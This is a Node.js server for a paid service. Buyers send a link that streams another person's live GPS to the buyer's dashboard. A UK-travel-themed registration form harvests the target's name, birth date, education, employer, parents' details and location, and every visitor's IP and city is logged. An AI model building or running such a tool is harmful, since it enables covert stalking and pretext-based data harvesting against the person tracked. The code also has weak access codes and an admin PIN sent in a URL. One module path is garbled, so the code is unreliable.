require("dotenv").config();

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const useragent = require("express-useragent");
const path = require("path");

const Session = require("./models/Session");
const Visitor = require("./models/Visitor");
const Location = require("./models/Location");
const Registration = require("./modelsration");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.set("trust proxy", true);
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(useragent.express());
app.use(express.static(path.join(__dirname, "public")));

const API_KEY = process.env.GOOGLE_API_KEY;
const PORT = process.env.PORT || 3000;
const SESSION_DURATION_MINUTES = Math.max(5, Number(process.env.SESSION_DURATION_MINUTES || 1440));

// Public reverse-geocoders must not be called for every GPS tick.
const geocodeCache = new Map();
const lastGeocodeBySession = new Map();
const GEOCODE_MIN_INTERVAL_MS = 60000;
const GEOCODE_DISTANCE_METERS = 100;
function distanceMeters(lat1, lon1, lat2, lon2) {
  const R=6371000, toRad=v=>v*Math.PI/180;
  const dLat=toRad(lat2-lat1), dLon=toRad(lon2-lon1);
  const a=Math.sin(dLat/2)**2+Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLon/2)**2;
  return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
}
function cachedAddressKey(lat,lng){return `${Number(lat).toFixed(4)},${Number(lng).toFixed(4)}`;}

function isValidCoordinate(latitude, longitude) {
  return Number.isFinite(Number(latitude)) &&
    Number.isFinite(Number(longitude)) &&
    Number(latitude) >= -90 && Number(latitude) <= 90 &&
    Number(longitude) >= -180 && Number(longitude) <= 180;
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

async function getAddress(lat, lng, sessionId = null, force = false) {
  if (!isValidCoordinate(lat, lng)) return "Invalid GPS coordinates";
  const key = cachedAddressKey(lat, lng);
  if (geocodeCache.has(key)) return geocodeCache.get(key);

  if (sessionId && !force) {
    const previous = lastGeocodeBySession.get(sessionId);
    if (previous && Date.now() - previous.time < GEOCODE_MIN_INTERVAL_MS && distanceMeters(previous.lat, previous.lng, lat, lng) < GEOCODE_DISTANCE_METERS) {
      return previous.address || "Address lookup pending";
    }
  }

  let address = "Address lookup unavailable — use the GPS coordinates on the map.";
  if (API_KEY) {
    try {
      const response = await axios.get("https://maps.googleapis.com/maps/api/geocode/json", {
        params: { latlng: `${lat},${lng}`, key: API_KEY, language: "en" }, timeout: 8000
      });
      if (response.data?.results?.length) address = response.data.results[0].formatted_address;
    } catch (error) { console.log("Google geocode failed:", error.message); }
  }

  // Only use Nominatim when Google is not configured, and never on every GPS tick.
  if (!API_KEY) {
    try {
      const response = await axios.get("https://nominatim.openstreetmap.org/reverse", {
        params: { lat, lon: lng, format: "jsonv2", addressdetails: 1, zoom: 18, "accept-language": "en" },
        headers: { "User-Agent": "RamatechCode-LocationTracker/1.0 (contact: ramatechcode14@gmail.com)" }, timeout: 10000
      });
      if (response.data?.display_name) address = response.data.display_name;
    } catch (error) { console.log("Nominatim geocode failed:", error.response?.status || error.message); }
  }
  geocodeCache.set(key, address);
  if (geocodeCache.size > 1000) geocodeCache.delete(geocodeCache.keys().next().value);
  if (sessionId) lastGeocodeBySession.set(sessionId, {lat:Number(lat),lng:Number(lng),time:Date.now(),address});
  return address;
}

async function getClientIp(req) {
  let ip = req.headers["x-forwarded-for"] || req.ip || "";
  if (Array.isArray(ip)) ip = ip[0];
  if (ip.includes(",")) ip = ip.split(",")[0];
  return ip.trim().replace("::ffff:", "");
}

async function recordVisitor(req) {
  try {
    const ip = await getClientIp(req);
    if (!ip || ip === "127.0.0.1" || ip === "::1") return;

    const geo = await axios.get(`https://ipwho.is/${encodeURIComponent(ip)}`, { timeout: 5000 });

    await Visitor.create({
      ip,
      country: geo.data?.country || "Unknown",
      city: geo.data?.city || "Unknown",
      browser: req.useragent?.browser || "Unknown",
      device: req.useragent?.source || "Unknown",
      page: req.originalUrl
    });
  } catch (error) {
    console.log("Visitor tracking error:", error.message);
  }
}

// IP location is only an approximate fallback. It is NOT the exact street address.
app.use((req, res, next) => {
  recordVisitor(req).catch(() => {});
  next();
});


app.post("/api/register", async (req, res) => {
  try {
    const {
      sessionId,

      // Personal information
      fullName,
      dateOfBirth,
      email,
      phone,
      address,

      // Education
      primarySchool,
      primaryGraduationYear,
      secondarySchool,
      secondaryGraduationYear,
      tertiarySchool,
      tertiaryGraduationYear,
      degree,
      course,

      // Skills / profession
      handwork,
      profession,
      employer,

      // Previous UK travel
      ukTravelledBefore,
      ukTravelYear,
      ukTravelPurpose,

      // Parent / guardian
      parentName,
      parentPhone,
      parentAddress,

      // UK travel plans
      ukPurpose,
      ukTravelDate,
      ukPurposeDetails,

      // GPS
      location
    } = req.body || {};

    // Basic validation
    if (!sessionId || !String(fullName || "").trim()) {
      return res.status(400).json({
        error: "Full name and session are required"
      });
    }

    // Check that the session is valid and paid
    const session = await Session.findOne({
      sessionId,
      paid: true
    });

    if (
      !session ||
      !session.expiresAt ||
      new Date() > session.expiresAt
    ) {
      return res.status(403).json({
        error: "This registration link is expired or invalid"
      });
    }

    // -----------------------------
    // PROCESS GPS LOCATION
    // -----------------------------

    let safeLocation = null;

    if (
      location &&
      isValidCoordinate(location.latitude, location.longitude)
    ) {
      const latitude = Number(location.latitude);
      const longitude = Number(location.longitude);

      const accuracy = Number.isFinite(
        Number(location.accuracy)
      )
        ? Number(location.accuracy)
        : undefined;

      const formattedAddress = await getAddress(
        latitude,
        longitude,
        sessionId,
        true
      );

      safeLocation = {
        latitude,
        longitude,
        accuracy,
        formattedAddress,
        source: "browser-gps"
      };
    }

    // -----------------------------
    // SAVE REGISTRATION
    // -----------------------------

    const registration = await Registration.create({

      sessionId,

      // Personal
      fullName: String(fullName || "").trim(),
      dateOfBirth: dateOfBirth || "",
      email: String(email || "").trim(),
      phone: String(phone || "").trim(),
      address: String(address || "").trim(),

      // Education
      primarySchool: String(primarySchool || "").trim(),
      primaryGraduationYear: primaryGraduationYear || "",

      secondarySchool: String(secondarySchool || "").trim(),
      secondaryGraduationYear: secondaryGraduationYear || "",

      tertiarySchool: String(tertiarySchool || "").trim(),
      tertiaryGraduationYear: tertiaryGraduationYear || "",

      degree: String(degree || "").trim(),
      course: String(course || "").trim(),

      // Skills / profession
      handwork: String(handwork || "").trim(),
      profession: String(profession || "").trim(),
      employer: String(employer || "").trim(),

      // UK travel history
      ukTravelledBefore: ukTravelledBefore || "",
      ukTravelYear: ukTravelYear || "",
      ukTravelPurpose: String(ukTravelPurpose || "").trim(),

      // Parent / guardian
      parentName: String(parentName || "").trim(),
      parentPhone: String(parentPhone || "").trim(),
      parentAddress: String(parentAddress || "").trim(),

      // UK travel plans
      ukPurpose: ukPurpose || "",
      ukTravelDate: ukTravelDate || "",
      ukPurposeDetails: String(ukPurposeDetails || "").trim(),

      // Location
      location: safeLocation,
      locationConsent: Boolean(safeLocation)
    });

    // -----------------------------
    // SAVE REGISTRATION LOCATION
    // -----------------------------

    if (safeLocation) {

      await Location.create({
        sessionId,
        latitude: safeLocation.latitude,
        longitude: safeLocation.longitude,
        accuracy: safeLocation.accuracy,
        address: safeLocation.formattedAddress,
        source: "registration-gps"
      });

      // Notify dashboard
      io.to(sessionId).emit("receive-registration", {
        id: registration._id.toString(),

        fullName: registration.fullName,
        email: registration.email,
        phone: registration.phone,
        address: safeLocation.formattedAddress,

        latitude: safeLocation.latitude,
        longitude: safeLocation.longitude,
        accuracy: safeLocation.accuracy,

        createdAt: registration.createdAt
      });
    }

    // -----------------------------
    // RESPONSE
    // -----------------------------

    return res.json({
      ok: true,

      registrationId: registration._id.toString(),

      location: safeLocation,

      message: safeLocation
        ? "Registration and location saved"
        : "Registration saved without GPS location"
    });

  } catch (error) {

    console.error(
      "Registration error:",
      error
    );

    return res.status(500).json({
      error: "Unable to save registration"
    });
  }
});


app.get("/registrations/:code", async (req, res) => {
  try {
    if (req.params.code === process.env.ADMIN_PIN) {
      return res.json(await Registration.find().sort({ createdAt: -1 }).limit(200));
    }
    const session = await Session.findOne({ accessCode: req.params.code, paid: true });
    if (!session || !session.expiresAt || new Date() > session.expiresAt) return res.status(403).json({ error: "Expired or invalid" });
    const data = await Registration.find({ sessionId: session.sessionId }).sort({ createdAt: -1 }).limit(200);
    res.json(data);
  } catch (error) {
    res.status(500).json({ error: "Server error" });
  }
});

app.post("/pay", async (req, res) => {
  try {
    const email = String(req.body.email || "").trim();
    if (!email) return res.status(400).json({ error: "Email is required" });

    const sessionId = uuidv4();
    const accessCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    const trackingToken = uuidv4().replace(/-/g, "");

    const response = await axios.post(
      "https://api.flutterwave.com/v3/payments",
      {
        tx_ref: sessionId,
        amount: 3000,
        currency: "NGN",
        redirect_url: `${process.env.APP_URL || "https://uk-awareness.onrender.com"}/success/${sessionId}`,
        customer: { email, name: "Customer" },
        customizations: {
          title: "Ramatechcode Tracking App",
          description: "Access to live tracking dashboard"
        }
      },
      {
        headers: {
          Authorization: `Bearer ${process.env.FLUTTERWAVE_SECRET}`,
          "Content-Type": "application/json"
        }
      }
    );

    await Session.create({
      sessionId,
      paid: false,
      accessCode,
      trackingToken
    });

    res.json({ paymentLink: response.data.data.link });
  } catch (error) {
    console.error("Payment error:", error.response?.data || error.message);
    res.status(500).json({ error: "Unable to create payment" });
  }
});

app.get("/success/:sessionId", async (req, res) => {
  try {
    const expiresAt = new Date(Date.now() + SESSION_DURATION_MINUTES * 60 * 1000);

    let session = await Session.findOne({ sessionId: req.params.sessionId });
    if (!session) return res.status(404).send("Session not found");

    if (!session.trackingToken) {
      session.trackingToken = uuidv4().replace(/-/g, "");
    }

    session.paid = true;
    session.expiresAt = expiresAt;
    await session.save();

    const baseUrl = process.env.APP_URL || "https://uk-awareness.onrender.com";
    const trackingLink = `${baseUrl}/track/${session.trackingToken}`;
    const dashboardLink = `/dashboard/${session.accessCode}`;

    res.send(`
      <!doctype html>
      <html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Payment Successful</title>
      <style>body{font-family:Arial;background:#0f172a;color:#fff;padding:25px}.box{max-width:650px;margin:auto;background:#1e293b;padding:25px;border-radius:15px}input{width:100%;box-sizing:border-box;padding:12px;margin:8px 0;border-radius:8px;border:0}button,a{display:inline-block;padding:12px 16px;margin:6px 4px 6px 0;border:0;border-radius:8px;background:#38bdf8;color:#06111d;text-decoration:none;font-weight:bold}</style></head>
      <body><div class="box">
      <h2>Payment Successful 🎉</h2>
      <p>Your dashboard access code:</p><h1>${escapeHtml(session.accessCode)}</h1>
      <p><b>Tracking link:</b></p>
      <input readonly value="${escapeHtml(trackingLink)}" onclick="this.select()">
      <p>Send this tracking link to the person who should share their location. Their browser will ask for GPS permission.</p>
      <a href="${dashboardLink}">Open Dashboard</a>
      <button onclick="navigator.clipboard.writeText(${JSON.stringify(trackingLink)}).then(()=>alert('Tracking link copied'))">Copy Tracking Link</button>
      <script>localStorage.setItem("sessionId", ${JSON.stringify(session.sessionId)});</script>
      </div></body></html>
    `);
  } catch (error) {
    console.error("Success page error:", error.message);
    res.status(500).send("Unable to complete the session.");
  }
});

app.get("/verify/:code", async (req, res) => {
  try {
    if (req.params.code === process.env.ADMIN_PIN) return res.json({ ok: true, master: true });

    const session = await Session.findOne({ accessCode: req.params.code, paid: true });
    if (!session) return res.json({ error: true });
    if (!session.expiresAt || new Date() > session.expiresAt) return res.json({ error: "expired" });

    res.json({ ok: true, sessionId: session.sessionId });
  } catch (error) {
    res.status(500).json({ error: "Server error" });
  }
});

// Public tracking page. It only works for an active paid tracking token.
app.get("/track/:token", async (req, res) => {
  try {
    const session = await Session.findOne({ trackingToken: req.params.token, paid: true });

    if (!session || !session.expiresAt || new Date() > session.expiresAt) {
      return res.status(403).send(`
        <h2>⛔ Tracking link expired or invalid</h2>
        <p>Ask the person who sent you the link for a new active link.</p>
      `);
    }

    const file = require("fs").readFileSync(path.join(__dirname, "public", "index.html"), "utf8");
    const html = file.replace("__TRACKING_SESSION_ID__", session.sessionId);
    res.send(html);
  } catch (error) {
    console.error("Tracking page error:", error.message);
    res.status(500).send("Unable to open tracking page.");
  }
});

io.on("connection", (socket) => {
  console.log("User connected:", socket.id);

  socket.on("join-session", async (sessionId, callback) => {
    try {
      const session = await Session.findOne({ sessionId, paid: true });
      if (!session || !session.expiresAt || new Date() > session.expiresAt) {
        if (typeof callback === "function") callback({ ok: false, error: "Session expired or invalid" });
        return;
      }

      socket.sessionId = session.sessionId;
      socket.join(session.sessionId);
      if (typeof callback === "function") callback({ ok: true });
    } catch (error) {
      if (typeof callback === "function") callback({ ok: false, error: "Server error" });
    }
  });

  socket.on("send-location", async (data, callback) => {
    try {
      const sessionId = socket.sessionId || data?.sessionId;
      const latitude = Number(data?.latitude);
      const longitude = Number(data?.longitude);
      const accuracy = Number.isFinite(Number(data?.accuracy)) ? Number(data.accuracy) : undefined;

      if (!sessionId || !isValidCoordinate(latitude, longitude)) {
        if (typeof callback === "function") callback({ ok: false, error: "Valid location/session required" });
        return;
      }

      const session = await Session.findOne({ sessionId, paid: true });
      if (!session || !session.expiresAt || new Date() > session.expiresAt) {
        if (typeof callback === "function") callback({ ok: false, error: "Session expired or invalid" });
        return;
      }

      // GPS coordinates can arrive several times per minute. Broadcast the live point immediately,
      // but reverse-geocode only periodically to avoid public API rate limits (429).
      const previousLive = await Location.findOne({ sessionId, source: "live-current" });
      let address = previousLive?.address || "Address lookup pending — use the live map marker.";
      const movedEnough = !previousLive || distanceMeters(previousLive.latitude, previousLive.longitude, latitude, longitude) >= GEOCODE_DISTANCE_METERS;
      const staleAddress = !lastGeocodeBySession.has(sessionId) || Date.now() - lastGeocodeBySession.get(sessionId).time >= GEOCODE_MIN_INTERVAL_MS;
      if (movedEnough && staleAddress) address = await getAddress(latitude, longitude, sessionId);

      const location = await Location.findOneAndUpdate(
        { sessionId, source: "live-current" },
        { $set: { latitude, longitude, accuracy, address, source: "live-current", createdAt: new Date() } },
        { new: true, upsert: true, setDefaultsOnInsert: true }
      );

      console.log("📍 LIVE LOCATION:", latitude, longitude, "accuracy", accuracy, "m", "address", address);
      io.to(sessionId).emit("receive-live-location", {
        id: location._id.toString(), latitude, longitude, accuracy, address,
        createdAt: location.createdAt, live: true
      });

      if (typeof callback === "function") callback({ ok: true });
    } catch (error) {
      console.error("Location error:", error.message);
      if (typeof callback === "function") callback({ ok: false, error: "Unable to save location" });
    }
  });

  socket.on("stop-live-location", async (data) => {
    const sessionId = socket.sessionId || data?.sessionId;
    if (sessionId) {
      io.to(sessionId).emit("live-location-stopped", { sessionId });
      console.log("🛑 LIVE LOCATION STOPPED:", sessionId);
    }
  });

  socket.on("disconnect", () => {
    console.log("User disconnected:", socket.id);
    if (socket.sessionId) io.to(socket.sessionId).emit("live-location-disconnected", { socketId: socket.id });
  });
});

app.get("/session/:code", async (req, res) => {
  try {
    if (req.params.code === process.env.ADMIN_PIN) {
      return res.json({ expiresAt: new Date(Date.now() + 999999999) });
    }

    const session = await Session.findOne({ accessCode: req.params.code, paid: true });
    if (!session || !session.expiresAt || new Date() > session.expiresAt) return res.json({ error: true });

    res.json({ expiresAt: session.expiresAt, sessionId: session.sessionId });
  } catch (error) {
    res.status(500).json({ error: true });
  }
});

app.get("/locations/:code", async (req, res) => {
  try {
    if (req.params.code === process.env.ADMIN_PIN) {
      return res.json(await Location.find().sort({ createdAt: -1 }).limit(100));
    }

    const session = await Session.findOne({ accessCode: req.params.code, paid: true });
    if (!session || !session.expiresAt || new Date() > session.expiresAt) {
      return res.json({ error: "Expired or invalid" });
    }

    const data = await Location.find({ sessionId: session.sessionId })
      .sort({ createdAt: -1 })
      .limit(100);

    res.json(data);
  } catch (error) {
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/dashboard/:code", async (req, res) => {
  try {
    const session = await Session.findOne({ accessCode: req.params.code, paid: true });

    if (!session) return res.send("❌ Invalid Access Code");
    if (!session.expiresAt || new Date() > session.expiresAt) {
      return res.send(`<h2>⛔ Access Expired</h2><p>Your tracking access period has ended.</p><a href="/pay.html">Purchase again</a>`);
    }

    return res.sendFile(path.join(__dirname, "public", "dashboard.html"));
  } catch (error) {
    res.status(500).send("Unable to open dashboard.");
  }
});

app.get("/admin", async (req, res) => {
  const pin = req.query.pin;
  if (pin !== process.env.ADMIN_PIN) {
    return res.send(`<h2>🔒 Admin Login</h2><form><input type="password" name="pin" placeholder="Enter Admin PIN"><button>Login</button></form>`);
  }

  const visitors = await Visitor.find().sort({ createdAt: -1 }).limit(100);
  let html = `<h1>Admin Panel</h1><style>body{font-family:Arial;background:#0f172a;color:white;padding:20px}.card{background:#1e293b;padding:15px;margin:10px 0;border-radius:10px}</style>`;

  visitors.forEach(v => {
    html += `<div class="card"><b>IP:</b> ${escapeHtml(v.ip)}<br><b>Country:</b> ${escapeHtml(v.country)}<br><b>City:</b> ${escapeHtml(v.city)}<br><b>Browser:</b> ${escapeHtml(v.browser)}<br><b>Device:</b> ${escapeHtml(v.device)}<br><b>Page:</b> ${escapeHtml(v.page)}<br><b>Time:</b> ${new Date(v.createdAt).toLocaleString("en-NG", { timeZone: "Africa/Lagos" })}</div>`;
  });

  res.send(html);
});

mongoose.connect(process.env.MONGO_URI)
  .then(() => {
    console.log("MongoDB connected");
    server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
  })
  .catch(err => {
    console.error("MongoDB connection error:", err);
    process.exit(1);
  });
